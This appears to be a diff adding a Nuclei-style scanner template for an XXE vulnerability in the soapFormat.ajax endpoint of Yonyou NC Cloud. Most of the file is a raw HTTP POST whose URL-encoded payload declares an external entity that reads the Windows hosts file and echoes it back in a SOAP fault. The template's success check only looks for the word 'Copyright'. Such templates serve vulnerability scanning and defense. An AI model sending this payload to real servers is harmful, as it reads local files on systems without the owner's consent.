@@ -1,0 +1,29 @@
+id: yonyouNC-soapFormat-xxe
+info:
+  name: yonyouNC-soapFormat-xxe
+  author: apple
+  severity: high
+  description: 用友NC Cloud soapFormat接口XXE漏洞.
+  reference:
+    - https://github.com/Y1-K1NG/poc_exp/blob/main/20231229%E7%94%A8%E5%8F%8BNC%20Cloud%20soapFormat%E6%8E%A5%E5%8F%A3XXE%E6%BC%8F%E6%B4%9E/poc.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /uapws/soapFormat.ajax HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0
+        Accept-Encoding: gzip, deflate, br
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Content-Length: 391
+        Upgrade-Insecure-Requests: 1
+
+        msg=%3C%21DOCTYPE+foo%5B%3C%21ENTITY+xxe1two+SYSTEM+%22file%3A%2F%2F%2FC%3A%2F%2Fwindows%2FSystem32%2Fdrivers%2Fetc%2Fhosts%22%3E+%5D%3E%3Csoap%3AEnvelope+xmlns%3Asoap%3D%22http%3A%2F%2Fschemas.xmlsoap.org%2Fsoap%2Fenvelope%2F%22%3E%3Csoap%3ABody%3E%3Csoap%3AFault%3E%3Cfaultcode%3Esoap%3AServer%26xxe1two%3B%3C%2Ffaultcode%3E%3C%2Fsoap%3AFault%3E%3C%2Fsoap%3ABody%3E%3C%2Fsoap%3AEnvelope%3E
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Copyright'
